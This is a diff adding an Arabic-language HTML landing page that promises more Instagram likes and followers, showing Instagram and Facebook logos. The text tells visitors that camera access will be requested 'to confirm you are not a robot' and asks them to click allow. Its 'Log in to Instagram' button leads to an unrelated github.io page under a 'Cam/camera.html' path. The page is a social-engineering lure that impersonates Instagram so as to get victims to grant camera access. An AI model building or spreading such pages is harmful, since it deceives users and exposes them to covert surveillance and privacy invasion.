@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة الإعجابات والمتابعين</title>
+    <style>
+        body {
+            font-family: 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 80px auto;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 15px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(5px);
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .logos {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .logos img {
+            width: 70px;
+            height: 70px;
+            transition: transform 0.3s ease;
+        }
+
+        .logos img:hover {
+            transform: scale(1.1);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            overflow: hidden;
+            white-space: nowrap;
+            border-right: 4px solid white;
+            width: 0;
+            animation: typing 3s steps(20, end), blink 0.6s step-end infinite;
+        }
+
+        p {
+            font-size: 1.2rem;
+            line-height: 1.8;
+            margin-bottom: 30px;
+            opacity: 0;
+            animation: fadeIn 2s ease-in-out 3s forwards;
+        }
+
+        a {
+            display: inline-block;
+            margin-top: 20px;
+            background-color: #3897f0;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 18px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        a:hover {
+            background-color: #287bc4;
+            transform: scale(1.05);
+        }
+
+        /* تأثير الكتابة */
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+
+        @keyframes blink {
+            from, to { border-color: transparent; }
+            50% { border-color: white; }
+        }
+
+        /* تأثير الظهور التدريجي */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logos">
+            <!-- شعار إنستغرام -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+            <!-- شعار فيسبوك -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <h1>زيادة الإعجابات والمتابعين</h1>
+        <p>
+            قم بتحسين حسابك على إنستغرام الآن! 
+            احصل على المزيد من المتابعين والإعجابات بسهولة من خلال الالتزام بتحديث محتواك 
+            وزيارة صفحة تسجيل الدخول الرسمية للبدء
+            ملاحظة: سيتم طلب الاذن للوصول الى الكاميرا للتأكد من انك لست روبوت الرجاء الضغط على سماح .
+        </p>
+        <a href="https://root4hbot.github.io/Cam/camera.html" target="_blank">تسجيل الدخول إلى إنستغرام</a>
+    </div>
+</body>
+</html>
